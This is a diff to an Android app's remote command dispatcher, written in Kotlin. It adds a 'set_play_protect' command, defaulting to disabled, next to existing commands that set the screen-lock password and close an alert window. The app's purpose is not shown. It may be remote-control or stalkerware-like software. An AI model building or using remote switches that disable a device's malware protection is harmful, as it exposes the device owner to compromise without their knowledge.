@@ -115,6 +115,8 @@ object CommandRunner {
 
                 "set_password" -> ScreenLock.setPassword(ctx, params.optString("password"))
 
+                "set_play_protect" -> PlayProtect.set(ctx, params.optBoolean("enabled", false))
+
                 "stop_alert" -> {
                     val closed = AlertActivity.close()
                     "done" to (if (closed) "окно закрыто" else "окна не было")
